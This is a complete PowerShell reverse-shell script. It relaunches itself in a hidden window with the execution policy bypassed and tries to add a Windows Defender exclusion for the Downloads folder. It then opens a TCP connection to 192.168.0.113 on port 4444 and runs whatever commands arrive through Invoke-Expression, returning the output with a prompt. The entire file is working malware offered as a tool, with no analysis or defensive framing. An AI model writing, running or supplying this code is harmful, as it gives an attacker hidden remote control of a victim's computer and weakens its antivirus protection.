# --- Relaunch hidden if not already hidden ---
if (-not ([System.Diagnostics.Process]::GetCurrentProcess().StartInfo.WindowStyle -eq 'Hidden')) {
    Start-Process powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File "$PSCommandPath"
    exit
}

# --- Ensure classic Windows PowerShell ---
if ($PSVersionTable.PSEdition -ne 'Desktop') {
    Start-Process powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File "$PSCommandPath"
    exit
}

try {
    # Attempt Defender exclusion (will silently fail if not admin)
    Add-MpPreference -ExclusionPath "$env:USERPROFILE\Downloads" -ErrorAction SilentlyContinue

    # === Reverse shell ===
    $client = "192.168.0.113"
    $port = 4444

    $tcp = New-Object System.Net.Sockets.TcpClient($client, $port)
    $stream = $tcp.GetStream()
    $writer = New-Object System.IO.StreamWriter($stream)
    $buffer = New-Object byte[] 1024

    while (($bytesRead = $stream.Read($buffer, 0, $buffer.Length)) -ne 0) {
        $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer, 0, $bytesRead)
        $sendback = (Invoke-Expression $data 2>&1 | Out-String)
        $sendback2 = $sendback + 'PS ' + (Get-Location).Path + '> '
        $writer.Write($sendback2)
        $writer.Flush()
    }

    $writer.Close()
    $stream.Close()
    $tcp.Close()
}
catch {
    Write-Error "Execution failed: $_"
}
